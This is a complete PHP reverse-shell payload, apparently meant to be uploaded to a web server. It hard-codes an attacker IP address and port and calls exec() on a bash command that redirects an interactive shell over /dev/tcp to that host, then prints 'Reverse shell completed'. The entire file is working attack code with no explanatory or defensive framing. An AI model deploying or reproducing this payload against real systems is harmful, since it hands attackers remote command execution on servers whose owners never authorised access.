<?php
$ip = '192.168.1.182';  // Attackers IP (yours)
$port = 1234;       // Change this to the desired port number
$shell = "/bin/bash -c 'bash -i >& /dev/tcp/{$ip}/{$port} 0>&1'";
exec($shell);
echo "Reverse shell completed";
?>

